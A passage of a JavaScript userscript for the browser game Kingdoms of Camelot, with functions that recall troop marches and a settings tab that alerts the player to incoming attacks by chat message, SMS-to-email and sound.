                villeencours = Cities.cities[c].id;
                break;
              }
            }    
        }  
  
  
           var march = Seed.queue_atkp["city" + villeencours]["m" + marchId];
           if (march == null){
             alert(""+culang.marchnotfound+"");
             return;
           }    
           var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
           params.mid = marchId;
           params.cid = villeencours; //march.toCityId;
            
           new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/undefend.php" + unsafeWindow.g_ajaxsuffix, {
               method: "post",
               parameters: params,
               onSuccess: function (rslt) {
                 if (rslt.ok){
 
                   var mymarch = unsafeWindow.seed.queue_atkp["city" + villeencours]["m" + marchId];
                   var marchtime = Math.abs(parseInt(mymarch.destinationUnixTime) - parseInt(mymarch.eventUnixTime));
                   mymarch.returnUnixTime = unixTime() + marchtime;
                   mymarch.marchStatus = 8;
     
                 } else {
                  
                  
                 }
               },
               onFailure: function () {
               
               
               },
     });
          
  },   
  ajaxRecall : function (marchId, cid, notify){
     
              var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
              params.mid = marchId;
              params.cid = cid;
              
              new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/cancelMarch.php" + unsafeWindow.g_ajaxsuffix, {
                  method: "post",
                  parameters: params,
                  onSuccess: function (rslt) {
                    if (rslt.ok){
                    
                     if(rslt.updateSeed){
 		       unsafeWindow.seed.queue_atkp["city"+params.cid]["m"+params.mid].marchStatus=8;   
 		       var marchtime=parseInt(unsafeWindow.seed.queue_atkp["city"+params.cid]["m"+params.mid].returnUnixTime)-parseInt(unsafeWindow.seed.queue_atkp["city"+params.cid]["m"+params.mid].destinationUnixTime);
 		       var ut=unsafeWindow.unixtime();
 		       if(unsafeWindow.seed.playerEffects.returnExpire>unsafeWindow.unixtime()){marchtime*=0.5}
		       unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId].destinationUnixTime=rslt.destinationUnixTime||ut;
		       unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId].returnUnixTime=rslt.returnUnixTime||ut+marchtime*rslt.returnMultiplier;
		       unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId].marchStatus=8;
 		       unsafeWindow.update_seed(rslt.updateSeed);
                     }
                     for(var j=1;j<13;j++){
		       unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId]["unit"+j+"Return"]=parseInt(unsafeWindow.seed.queue_atkp["city"+cid]["m"+marchId]["unit"+j+"Count"])
 		     }
 		    }
                  },
                  onFailure: function () {
                  
                  
                  },
     });

  },
};
/***********************************************************************************/
/************ KOC POWER - TABS TOWER **********************************************/
/*********************************************************************************/
Tabs.tower = {
  tabLabel: culang.holyplace,
  tabOrder: StyleOptions.toHeiligtum,
  myDiv: null,
  generateIncomingFunc : null,
  fixTargetEnabled : false,
  secondTimer : null,
  soundPlaying : false,
  defMode : {},  
  soundRepeatTimer : null,
  soundStopTimer : null,
  towerMarches: [],
  Providers : { 0: { 'country': "--Land--", 'provider': "--"+culang.provider+"--" }, 1: { 'country': "AUSTRALIA", 'provider': "T-Mobile" }, 2: { 'country': "AUSTRALIA", 'provider': "Optus Zoo" }, 3: { 'country': "AUSTRIA", 'provider': "T-Mobile" }, 4: { 'country': "BULGARIA", 'provider': "Mtel" }, 5: { 'country': "BULGARIA", 'provider': "Globul" }, 6: { 'country': "CANADA", 'provider': "Aliant" }, 7: { 'country': "CANADA", 'provider': "Bell Mobility" }, 8: { 'country': "CANADA", 'provider': "Fido" }, 9: { 'country': "CANADA", 'provider': "MTS Mobility" }, 10: { 'country': "CANADA", 'provider': "Rogers Wireless" }, 11: { 'country': "CANADA", 'provider': "Sasktel Mobility" }, 12: { 'country': "CANADA", 'provider': "Telus" }, 13: { 'country': "CANADA", 'provider': "Virgin Mobile" }, 14: { 'country': "CANADA", 'provider': "Presidents Choice" }, 15: { 'country': "GERMANY", 'provider': "T-Mobile" }, 16: { 'country': "GERMANY", 'provider': "Vodafone" }, 17: { 'country': "GERMANY", 'provider': "O2" }, 18: { 'country': "GERMANY", 'provider': "E-Plus" }, 19: { 'country': "ICELAND", 'provider': "OgVodafone" }, 20: { 'country': "ICELAND", 'provider': "Siminn" }, 21: { 'country': "INDIA", 'provider': "Andhra Pradesh AirTel" }, 22: { 'country': "INDIA", 'provider': "Andhra Pradesh Idea Cellular" }, 23: { 'country': "INDIA", 'provider': "Chennal Skycell Airtel" }, 24: { 'country': "INDIA", 'provider': "Chennel RPG Cellular" }, 25: { 'country': "INDIA", 'provider': "Delhi Airtel" }, 26: { 'country': "INDIA", 'provider': "Delhi Hutch" }, 27: { 'country': "INDIA", 'provider': "Gujarat Idea Cellular" }, 28: { 'country': "INDIA", 'provider': "Gujaret Airtel" }, 29: { 'country': "INDIA", 'provider': "Gujaret Celforce" }, 30: { 'country': "INDIA", 'provider': "Goa Airtel" }, 31: { 'country': "INDIA", 'provider': "Goa BPL Mobile" }, 32: { 'country': "INDIA", 'provider': "Goa Idea Cellular" }, 33: { 'country': "INDIA", 'provider': "Haryana Airtel" }, 34: { 'country': "INDIA", 'provider': "Haryana Escotel" }, 35: { 'country': "INDIA", 'provider': "Himachal Pradesh Airtel" }, 36: { 'country': "INDIA", 'provider': "Karnataka Airtel" }, 37: { 'country': "INDIA", 'provider': "Kerala Airtel" }, 38: { 'country': "INDIA", 'provider': "Kerala Escotel" }, 39: { 'country': "INDIA", 'provider': "Kerala BPL Mobile" }, 40: { 'country': "INDIA", 'provider': "Kolkata Airtel" }, 41: { 'country': "INDIA", 'provider': "Madhya Pradesh Airtel" }, 42: { 'country': "INDIA", 'provider': "Maharashtra Airtel" }, 43: { 'country': "INDIA", 'provider': "Maharashtra BPL Mobile" }, 44: { 'country': "INDIA", 'provider': "Maharashtra Idea Cellular" }, 45: { 'country': "INDIA", 'provider': "Mumbai Airtel" }, 46: { 'country': "INDIA", 'provider': "Mumbai BPL Mobile" }, 47: { 'country': "INDIA", 'provider': "Punjab Airtel" }, 48: { 'country': "INDIA", 'provider': "Pondicherry BPL Mobile" }, 49: { 'country': "INDIA", 'provider': "Tamil Nadu Airtel" }, 50: { 'country': "INDIA", 'provider': "Tamil Nadu BPL Mobile" }, 51: { 'country': "INDIA", 'provider': "Tamil Nadu Aircel" }, 52: { 'country': "INDIA", 'provider': "Uttar Pradesh West Escotel" }, 53: { 'country': "IRELAND", 'provider': "Meteor" }, 54: { 'country': "IRELAND", 'provider': "Meteor MMS" }, 55: { 'country': "ITALY", 'provider': "TIM" }, 56: { 'country': "ITALY", 'provider': "Vodafone" }, 57: { 'country': "JAPAN", 'provider': "AU by KDDI" }, 58: { 'country': "JAPAN", 'provider': "NTT DoCoMo" }, 59: { 'country': "JAPAN", 'provider': "Vodafone Chuugoku/Western" }, 60: { 'country': "JAPAN", 'provider': "Vodafone Hokkaido" }, 61: { 'country': "JAPAN", 'provider': "Vodafone Hokuriko/Central North" }, 62: { 'country': "JAPAN", 'provider': "Vodafone Kansai/West, including Osaka" }, 63: { 'country': "JAPAN", 'provider': "Vodafone Kanto/Koushin/East including Tokyo" }, 64: { 'country': "JAPAN", 'provider': "Vodafone Kyuushu/Okinawa" }, 65: { 'country': "JAPAN", 'provider': "Vodafone Shikoku" }, 66: { 'country': "JAPAN", 'provider': "Vodafone Touhoku/Niigata/North" }, 67: { 'country': "JAPAN", 'provider': "Vodafone Toukai/Central" }, 68: { 'country': "JAPAN", 'provider': "Willcom" }, 69: { 'country': "JAPAN", 'provider': "Willcom di" }, 70: { 'country': "JAPAN", 'provider': "Willcom dj" }, 71: { 'country': "JAPAN", 'provider': "Willcom dk" }, 72: { 'country': "NETHERLANDS", 'provider': "T-Mobile" }, 73: { 'country': "NETHERLANDS", 'provider': "Orange" }, 74: { 'country': "SINGAPORE", 'provider': "M1" }, 75: { 'country': "SOUTH AFRICA", 'provider': "Vodacom" }, 76: { 'country': "SPAIN", 'provider': "Telefonica Movistar" }, 77: { 'country': "SPAIN", 'provider': "Vodafone" }, 78: { 'country': "SWEDEN", 'provider': "Tele2" }, 79: { 'country': "UNITED STATES", 'provider': "Teleflip" }, 80: { 'country': "UNITED STATES", 'provider': "Alltel" }, 81: { 'country': "UNITED STATES", 'provider': "Ameritech" }, 82: { 'country': "UNITED STATES", 'provider': "ATT Wireless" }, 83: { 'country': "UNITED STATES", 'provider': "Bellsouth" }, 84: { 'country': "UNITED STATES", 'provider': "Boost" }, 85: { 'country': "UNITED STATES", 'provider': "CellularOne" }, 86: { 'country': "UNITED STATES", 'provider': "CellularOne MMS" }, 87: { 'country': "UNITED STATES", 'provider': "Cingular" }, 88: { 'country': "UNITED STATES", 'provider': "Edge Wireless" }, 89: { 'country': "UNITED STATES", 'provider': "Sprint PCS" }, 90: { 'country': "UNITED STATES", 'provider': "T-Mobile" }, 91: { 'country': "UNITED STATES", 'provider': "Metro PCS" }, 92: { 'country': "UNITED STATES", 'provider': "Nextel" }, 93: { 'country': "UNITED STATES", 'provider': "O2" }, 94: { 'country': "UNITED STATES", 'provider': "Orange" }, 95: { 'country': "UNITED STATES", 'provider': "Qwest" }, 96: { 'country': "UNITED STATES", 'provider': "Rogers Wireless" }, 97: { 'country': "UNITED STATES", 'provider': "Telus Mobility" }, 98: { 'country': "UNITED STATES", 'provider': "US Cellular" }, 99: { 'country': "UNITED STATES", 'provider': "Verizon" }, 100: { 'country': "UNITED STATES", 'provider': "Virgin Mobile" }, 101: { 'country': "UNITED KINGDOM", 'provider': "O2 1" }, 102: { 'country': "UNITED KINGDOM", 'provider': "O2 2" }, 103: { 'country': "UNITED KINGDOM", 'provider': "Orange" }, 104: { 'country': "UNITED KINGDOM", 'provider': "T-Mobile" }, 105: { 'country': "UNITED KINGDOM", 'provider': "Virgin Mobile" }, 106: { 'country': "UNITED KINGDOM", 'provider': "Vodafone" }, 107: { 'country': "BELGIUM", 'provider': "mobistar" }, 108: { 'country': "GERMANY", 'provider': "1und1" }, 109: { 'country': "UNITED STATES", 'provider': "MyCricket" },110: { 'country': "Philippines", 'provider': "Smart" },111: { 'country': "UNITED STATES", 'provider': "CellularSouth" },112: { 'country': "UNITED STATES", 'provider': "Viaero" } },
 
 init: function(div){
  var t = Tabs.tower;
  t.myDiv = div;
  if (Options.scStopSound) {
  AddTowerTab(''+culang.stopsound+'', t.stopSoundAlerts, 'pbtowertab');
  }
  if (GM_getValue ('towerMarches_'+getServerId()) != null)
    GM_deleteValue ('towerMarches_'+getServerId());   // remove deprecated data if it exists
   
  var m = '<DIV class=pdxStat>'+culang.Hsac+' - '+culang.Hsettings+'</div><TABLE class=pdxTab><TR align=center>';

  for (var i=0; i<Cities.cities.length; i++)
    m += '<TD width=95><SPAN id=pbtacity_'+ i +'>' + Cities.cities[i].name + '</span></td>';
  m += '</tr><TR align=center>';
  for (var cityId in Cities.byID)
  m += '<TD><INPUT type=submit id=pdxTabut_'+ cityId +' value=""></td>';
  m += '</tr><TR align=center>';
  for (var cityId in Cities.byID)
   m += '<TD><CENTER><INPUT id=pbattackqueue_' + cityId + ' type=submit value="A 0 | S 0"></center></td>';
  m += '</tr></table><BR><DIV><CENTER><INPUT id=pbSoundStop type=submit value="'+culang.STstopsound+'"></center></div><DIV id=pbSwfPlayer></div>';
  m += '<BR><DIV class=pdxStat>'+culang.Htower+' - '+culang.Hsettings+'</div><TABLE class=pdxTab><tr><td width="20" align=left><INPUT id=pbcellenable type=checkbox '+ (Options.celltext.atext?'CHECKED ':'') +'/></td>\
    <td align=left>'+culang.Osms2mail+': <INPUT id=pbnum1 type=text size=4 maxlength=4 value="'+ Options.celltext.num1 +'"  '+(Options.celltext.provider==0?'DISABLED':'')+'\>&nbsp;<INPUT id=pbnum2 type=text size=3 maxlength=3 value="'+ Options.celltext.num2 +'" '+(Options.celltext.provider==0?'DISABLED':'')+'\>&nbsp;<INPUT id=pbnum3 type=text size=5 maxlength=5 value="'+ Options.celltext.num3 +'" '+(Options.celltext.provider==0?'DISABLED':'')+'\> '+culang.smssend+' </td>\
   <td width="48" align=left><INPUT id=paMailHelp type=submit value="'+culang.helpbutton+'"></td></tr><tr><td></td> <TD colspan="2" align=left>'+culang.land+': <select id="pbfrmcountry">';
 for (var i in t.Providers) {
 var ret=m.indexOf(t.Providers[i].country);
 if (ret==-1) {
 if (t.Providers[i].country==t.Providers[Options.celltext.provider].country) {
 m += '<option value="'+t.Providers[i].country+'" selected="selected">'+t.Providers[i].country+'</option>'; // Load Previous Provider Selection
 }
 else {
 m += '<option value="'+t.Providers[i].country+'">'+t.Providers[i].country+'</option>';
 }
 }
 }
 m += '</select>\
 <select id="pbfrmprovider" '+(Options.celltext.provider==0?'DISABLED':'')+'><option value=0 >--'+culang.provider+'--</option>';
 for (var i in t.Providers) {
 if(t.Providers[i].country == t.Providers[Options.celltext.provider].country)
 if(Options.celltext.provider == i)
 m += '<option value="'+i+'" selected="selected">'+t.Providers[i].provider+'</option>'; // Load Previous Provider Selection
 else
 m += '<option value="'+i+'">'+t.Providers[i].provider+'</option>';
 }
 m += '</select></td></tr>\
		<TR><TD>&nbsp;</td><TD colspan="2">&nbsp;</td></tr>\
		<TR><TD><INPUT id=pbalertEnable type=checkbox '+ (Options.alertConfig.aChat?'CHECKED ':'') +'/></td><TD colspan="2">'+culang.STshowinc+'</td></tr>\
		<TR><TD></td><TD colspan="2"><TABLE cellpadding=0 cellspacing=0>\
		<TR><TD align=right>'+culang.STmessage +': &nbsp; </td><TD><INPUT id=pbalertPrefix type=text size=60 maxlength=120 value="'+ Options.alertConfig.aPrefix +'" \></td></tr>		<TR><TD align=right>'+culang.STonscout +': &nbsp; </td><TD><INPUT id=pbalertScout type=checkbox '+ (Options.alertConfig.scouting?'CHECKED ':'') +'/></td></tr>		<TR><TD align=right>'+culang.STonwild +': &nbsp; </td><TD><INPUT id=pbalertWild type=checkbox '+ (Options.alertConfig.wilds?'CHECKED ':'') +'/></td></tr>		<TR><TD align=right>'+culang.STshowdef +': &nbsp; </td><TD><INPUT id=pbalertDefend type=checkbox '+ (Options.alertConfig.defend?'CHECKED ':'') +'/></td></tr>		<TR><TD align=right>'+culang.STmessage +' '+culang.def+':&nbsp;</td><TD><INPUT id=pbalertDefendMSG type=text size=60 maxlength=160 value="'+ Options.defendMessage +'" \></td></tr>		<TR><TD align=right>'+culang.STmessage +' '+culang.hide+':&nbsp;</td><TD><INPUT id=pbalertHide type=text size=60 maxlength=160 value="'+ Options.hideMessage +'" \></td></tr>		<TR><TD align=right>'+culang.STviccity+'&nbsp;&nbsp; </td><TD><span id=pbalerterr><INPUT id=pbincludeCityName type=checkbox '+ (Options.includeCityName?'CHECKED ':'') +'/>		</span></td></tr><TR><TD align=right>'+culang.STvicdip+'</td><TD><INPUT id=pbincludeAlliance type=checkbox '+ (Options.includeAlliance?'CHECKED ':'') +'/></td></tr><TR>		<TD align=right>'+culang.victim+' &nbsp;'+culang.might+':</td><TD><INPUT id=pbincludeMight type=checkbox '+ (Options.includeMight?'CHECKED ':'') +'/></td>		</tr><TR><TD align=right>'+culang.STtroops +':</td><TD><INPUT id=pbalertTroops type=text size=7 value="'+ Options.alertConfig.minTroops +'" \></td></tr>		</tr><TR><TD align=right>'+culang.STstopraids+':</td><TD><INPUT id=pbalertraid type=checkbox '+ (Options.alertConfig.raid?'CHECKED':'') +'/></td></tr>		</table></td></tr>\
		<TR><TD><BR></td></tr>\
		<TR><TD><INPUT id=pbSoundEnable type=checkbox '+ (Options.alertSound.enabled?'CHECKED ':'') +'/></td><TD colspan="2">'+culang.STplaysound+' <select id=pbalert>\
		<option value=http://koc.god-like.info/sirene.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/alarm.mp3'?'SELECTED':'') + '>'+culang.SDefault+'</option>		<option value=http://koc.god-like.info/muahaha.MP3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/muahaha.MP3'?'SELECTED':'') + '>'+culang.SMuahaha1+'</option>		<option value=http://koc.god-like.info/muahaha2.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/muahaha2.mp3'?'SELECTED':'') + '>'+culang.SMuahaha2+'</option>		<option value=http://koc.god-like.info/muahaha3.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/muahaha3.mp3'?'SELECTED':'') + '>'+culang.SMuahaha3+'</option>		<option value=http://koc.god-like.info/punch.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/punch.mp3'?'SELECTED':'') + '>'+culang.SPunch+'</option>		<option value=http://koc.god-like.info/phone.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/phone.mp3'?'SELECTED':'') + '>'+culang.SPhone+'</option>		<option value=http://koc.god-like.info/police.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/police.mp3'?'SELECTED':'') + '>'+culang.SPolice+'</option>		<option value=http://koc.god-like.info/piepen.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/piepen.mp3'?'SELECTED':'') + '>'+culang.SBeep+'</option>		<option value=http://koc.god-like.info/schrei.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/schrei.mp3'?'SELECTED':'') + '>'+culang.SScreem+'</option>		<option value=http://koc.god-like.info/unstable.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/unstable.mp3'?'SELECTED':'') + '>'+culang.SUnstable+'</option>		<option value=http://koc.god-like.info/waring.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/waring.mp3'?'SELECTED':'') + '>'+culang.SWaring+'</option>		<option value=http://koc.god-like.info/western.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/western.mp3'?'SELECTED':'') + '>'+culang.SWestern+'</option>		<option value=http://koc.god-like.info/jacnoho-special.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/jacnoho-special.mp3'?'SELECTED':'') + '>jacnoho</option>		<option value=http://koc.god-like.info/jacnoho-special-2.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/jacnoho-special-2.mp3'?'SELECTED':'') + '>jacnoho2</option>\
		<option value=http://koc.god-like.info/skyandsand.mp3 ' + (Options.alertSound.soundUrl=='http://koc.god-like.info/skyandsand.mp3'?'SELECTED':'') + '>Sky and Sand</option>\
		</select> <a href="http://koc.god-like.org/?p=149" target="_blank">'+culang.STlinklist+'</a> - <a href="https://code.google.com/p/koc-power-pdx/issues/entry" target="_blank">'+culang.uploadSounds+'</a>! ('+culang.attachFile+') </td></tr>\
		<TR><TD></td><td colspan="2">\
		<DIV id=pbLoadingSwf>'+culang.dlswf+'</div><DIV style="display:none" id=pbSoundOpts><TABLE cellpadding=0 cellspacing=0>\
		<TR><TD align=right>'+culang.STmp3+': &nbsp; </td><TD><INPUT id=pbsoundFile type=text size=55 maxlength=160 value="'+ Options.alertSound.soundUrl +'" \>\
		&nbsp; </td><TD><INPUT id=pbSoundLoad type=submit value=Download><INPUT id=pbSoundDefault type=submit value="'+culang.reset+'"></td></tr>\
		<TR><TD align=right>'+culang.vol+': &nbsp; </td><TD><TABLE cellpadding=0 cellspacing=0 class=pdxTab><TR valign=middle><TD><SPAN id=pbVolSlider></span></td><TD width=15></td><TD align=right id=pbVolOut>0</td></td></table></td><TD align=center><SPAN id=pbLoadStat>xx</span></td></tr>\
		<TR><TD align=right><INPUT id=pbSoundRepeat type=checkbox '+ (Options.alertSound.repeat?'CHECKED ':'') +'/></td><TD> '+culang.STplayevery+' <INPUT id=pbSoundEvery type=text size=2 maxlength=5 value="'+ Options.alertSound.repeatDelay +'"> '+culang.STplaymin+'</td></tr>\
		<TR><TD></td><TD>'+culang.STand+' <INPUT id=pbSoundLength type=text size=3 maxlength=5 value="'+ Options.alertSound.playLength +'"> '+culang.STplayfor+'</td></tr>\
		<TR><TD></td><TD><INPUT type=submit value="'+culang.play+'" id=pbPlayNow></td></tr></table></div><td width="10"></td></tr>\
		</table><BR>';
  t.myDiv.innerHTML = m;
  
  t.mss = new CmatSimpleSound(SWF_PLAYER_URL, null, {height:0, width:0}, t.e_swfLoaded, 'debug=n');
  t.mss.swfDebug = function (m){ logit ('SWF: '+ m)};
  t.mss.swfPlayComplete = t.e_soundFinished;
  t.mss.swfLoadComplete = t.e_soundFileLoaded;
  unsafeWindow.matSimpleSound01 = t.mss;   // let swf find it

  t.volSlider = new SliderBar (document.getElementById('pbVolSlider'), 200, 21, 0);
  t.volSlider.setChangeListener(t.e_volChanged);
  document.getElementById('paMailHelp').addEventListener ('click', t.mailHelpPop, false);
  document.getElementById('pbPlayNow').addEventListener ('click', function (){t.playSound(false)}, false);
  document.getElementById('pbSoundStop').addEventListener ('click', t.stopSoundAlerts, false);
  document.getElementById('pbSoundRepeat').addEventListener ('change', function (e){Options.alertSound.repeat = e.target.checked}, false);
  document.getElementById('pbSoundEvery').addEventListener ('change', function (e){Options.alertSound.repeatDelay = e.target.value}, false);
  document.getElementById('pbSoundLength').addEventListener ('change', function (e){Options.alertSound.playLength = e.target.value}, false);
  document.getElementById('pbSoundEnable').addEventListener ('change', function (e){Options.alertSound.enabled = e.target.checked}, false);
  document.getElementById('pbcellenable').addEventListener ('change', function (e){Options.celltext.atext = e.target.checked;}, false);

  document.getElementById('pbSoundStop').disabled = true;
  document.getElementById('pbalertEnable').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbincludeMight').addEventListener    ('change', t.e_alertOptChanged, false);
  document.getElementById('pbincludeAlliance').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbincludeCityName').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertPrefix').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertScout').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertWild').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertDefend').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertDefendMSG').addEventListener ('change', t.e_alertOptChanged, false);

  document.getElementById('pbalertHide').addEventListener       ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertTroops').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbfrmcountry').addEventListener ('change', t.setCountry, false);
  document.getElementById('pbfrmprovider').addEventListener ('change', t.setProvider, false);
  document.getElementById('pbnum1').addEventListener ('change', t.phonenum, false);
  document.getElementById('pbnum2').addEventListener ('change', t.phonenum, false);
  document.getElementById('pbnum3').addEventListener ('change', t.phonenum, false);
  document.getElementById('pbalertraid').addEventListener ('change', t.e_alertOptChanged, false);

  document.getElementById('pbsoundFile').addEventListener ('change', function (){
    Options.alertSound.soundUrl = document.getElementById('pbsoundFile').value;
    t.loadUrl (Options.alertSound.soundUrl);
    }, false);
  document.getElementById('pbalert').addEventListener ('change', function (){
    Options.alertSound.soundUrl = document.getElementById('pbalert').value;
    document.getElementById('pbsoundFile').value = document.getElementById('pbalert').value;
    t.loadUrl (Options.alertSound.soundUrl);
    }, false);
  document.getElementById('pbSoundDefault').addEventListener ('click', function (){
    document.getElementById('pbsoundFile').value = 'http://koc.god-like.info/sirene.mp3';
    Options.alertSound.soundUrl = 'http://koc.god-like.info/sirene.mp3';
    t.loadUrl ('http://koc.god-like.info/sirene.mp3');
    }, false);
  for (var cityId in Cities.byID){
    var but = document.getElementById ('pdxTabut_'+ cityId);
    addListener (but, cityId);
    t.defMode[cityId] =  parseInt(Seed.citystats["city" + cityId].gate);
    t.displayDefMode (cityId);
  var btnNameT = 'pbattackqueue_' + cityId;
    addTowerEventListener(cityId, btnNameT);
  }
  function addListener (but, i){
    but.addEventListener ('click', function (){t.butToggleDefMode(i)}, false);
  }
  function addTowerEventListener(cityId, name){
    document.getElementById(name).addEventListener('click', function(){
      t.showTowerIncoming(cityId);
    }, false);
  }  
  setInterval (t.eachSecond, 2000);
  },      
  show : function (){
  var t = Tabs.tower;
   mainPop.div.style.width = 750 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  hide : function (){
  var t = Tabs.tower;
   //mainPop.div.style.width = 750 + 'px';
   //if (Options.widescreen==true)mainPop.div.style.width = 930 + 'px';
  },
 mailHelpPop : function (){
  var helpmailText = ''+culang.helpmailText+'';
  var pop = new CPopup ('giftHelp', 0, 0, 746, 100, true);
  pop.centerMe (mainPop.getMainDiv());  
  pop.getMainDiv().innerHTML = helpmailText;
  pop.getTopDiv().innerHTML = '<div class=showBadged><CENTER>'+culang.sms2mail+'</center></div>';
  pop.show (true);
  },
  loadUrl : function (url){
  var t = Tabs.tower;
  t.mss.load (1, url, true);
  document.getElementById('pbLoadStat').innerHTML = 'Loading';
  },
  phonenum : function() {
 Options.celltext.num1 = document.getElementById('pbnum1').value;
 Options.celltext.num2 = document.getElementById('pbnum2').value;
 Options.celltext.num3 = document.getElementById('pbnum3').value;
 saveOptions();
 },

 setCountry : function(){
 var t = Tabs.tower;
 var myselect=document.getElementById("pbfrmprovider");
 myselect.innerHTML = '<option value=0 >--'+culang.provider+'--</option>';
 myselect.disabled = true;
 for (var i in t.Providers) {
 if (t.Providers[i].country == document.getElementById("pbfrmcountry").value){
 var addoption = document.createElement('option');
 addoption.value = i;
 addoption.text = t.Providers[i].provider;
 myselect.add(addoption, null) //add new option to end of "Providers"
 }
 }
 myselect.disabled = false;
 },

 setProvider : function(){
 var ddProvider = document.getElementById("pbfrmprovider").wrappedJSObject;
 Options.celltext.provider=ddProvider.options[ddProvider.selectedIndex].value;
 if(ddProvider.selectedIndex > 0){
 document.getElementById("pbnum1").disabled = false;
 document.getElementById("pbnum2").disabled = false;
 document.getElementById("pbnum3").disabled = false;
 } else {
 document.getElementById("pbnum1").disabled = true;
 document.getElementById("pbnum2").disabled = true;
 document.getElementById("pbnum3").disabled = true;
 }
 //alert(Options.celltext.provider);
 },     
  e_swfLoaded : function (){
  var t = Tabs.tower;
  document.getElementById('pbLoadingSwf').style.display = 'none';
  document.getElementById('pbSoundOpts').style.display = 'inline';
  t.volSlider.setValue (Options.alertSound.volume/100);
  t.loadUrl (Options.alertSound.soundUrl);
  setTimeout (function (){t.mss.setVolume (1, Options.alertSound.volume);}, 500);
  if (Options.alertSound.alarmActive && Options.alertSound.expireTime>unixTime())   
    t.soundTheAlert();
  },
  
e_alertOptChanged : function (){
  var t = Tabs.tower;
  Options.alertConfig.aChat = document.getElementById('pbalertEnable').checked;
  Options.alertConfig.aPrefix=document.getElementById('pbalertPrefix').value;
  Options.defendMessage=document.getElementById('pbalertDefendMSG').value;
  Options.includeMight=document.getElementById('pbincludeMight').checked;
  Options.includeAlliance=document.getElementById('pbincludeAlliance').checked;
  Options.includeCityName=document.getElementById('pbincludeCityName').checked;
  Options.hideMessage=document.getElementById('pbalertHide').value;
  Options.alertConfig.scouting=document.getElementById('pbalertScout').checked;      
  Options.alertConfig.wilds=document.getElementById('pbalertWild').checked;
  Options.alertConfig.defend=document.getElementById('pbalertDefend').checked;
  Options.alertConfig.raid=document.getElementById('pbalertraid').checked;
  
  var mt = parseInt(document.getElementById('pbalertTroops').value);
  if (mt<1 || mt>120000){
    document.getElementById('pbalertTroops').value = Options.alertConfig.minTroops;
    document.getElementById('pbalerterr').innerHTML = '<font color=#600000><B>INVALID</b></font>';
    setTimeout (function (){document.getElementById('pbalerterr').innerHTML =''}, 2000);
    return;
  }
  Options.alertConfig.minTroops = mt;
saveOptions();
  },
  
  e_volChanged : function (val){
  var t = Tabs.tower;
  document.getElementById('pbVolOut').innerHTML = parseInt(val*100);
  Options.alertSound.volume = parseInt(val*100);
  t.mss.setVolume (1, Options.alertSound.volume);
  },
  
  butToggleDefMode : function (cityId){
  var t = Tabs.tower;
  var mode = 1;
  if (Seed.citystats["city" + cityId].gate != 0)
    mode = 0;
  t.ajaxSetDefMode (cityId, mode, function (newMode){
    t.defMode[cityId] = newMode;
    t.displayDefMode (cityId);
    });
  },
    
  displayDefMode : function (cityId){
  var t = Tabs.tower;
  var but = document.getElementById('pdxTabut_'+ cityId);
  if (t.defMode[cityId]){
    but.className = 'pbDefButOn';
    but.value = ''+culang.stdef+' = '+culang.buttonon;  
  } else {
    but.className = 'pbDefButOff';
    but.value = ''+culang.stdef+' = '+culang.buttonoff;
  }  
  },
  
  eachSecond : function (){
  var t = Tabs.tower;
  for (var cityId in Cities.byID){
    if (Seed.citystats["city" + cityId].gate != t.defMode[cityId]){     // user changed def mode
    t.defMode[cityId] = Seed.citystats["city"+ cityId].gate;
    t.displayDefMode (cityId);
    }
	 Options.alertConfig.raidautoswitch[cityId] = false;
  }
  var now = unixTime();
var incomming = false;
  if (matTypeof(Seed.queue_atkinc) != 'array'){
    for (var k in Seed.queue_atkinc){   // check each incoming march
    var m = Seed.queue_atkinc[k];
    if ((m.marchType==3 || m.marchType==4) && parseIntNan(m.arrivalTime)>now){
      if (m.departureTime > Options.alertConfig.lastAttack){
      Options.alertConfig.lastAttack = m.departureTime;  
      t.newIncoming (m);
      }          
 incomming = true;
  if (Options.alertConfig.raid){
			Options.alertConfig.raidautoswitch[m.toCityId] = true;
			}
		}
    }
}
  if (Options.alertSound.alarmActive && (now > Options.alertSound.expireTime))
    t.stopSoundAlerts();

    t.towerMarches = [];
    for (var i = 0; i < Cities.cities.length; i++) {
      var cId = Cities.cities[i].id;
      t['attackCount_' + cId] = 0;
      t['scoutCount_' + cId] = 0;
    }
    if (matTypeof(Seed.queue_atkinc) != 'array') {
      for (var k in Seed.queue_atkinc) {
        var m = Seed.queue_atkinc[k];
        if ((m.marchType == 3 || m.marchType == 4) && parseIntNan(m.arrivalTime) > now) {
          t.handleTowerData(m);

        }
      }
    }
    for (var i = 0; i < Cities.cities.length; i++) {
      var cId = Cities.cities[i].id;
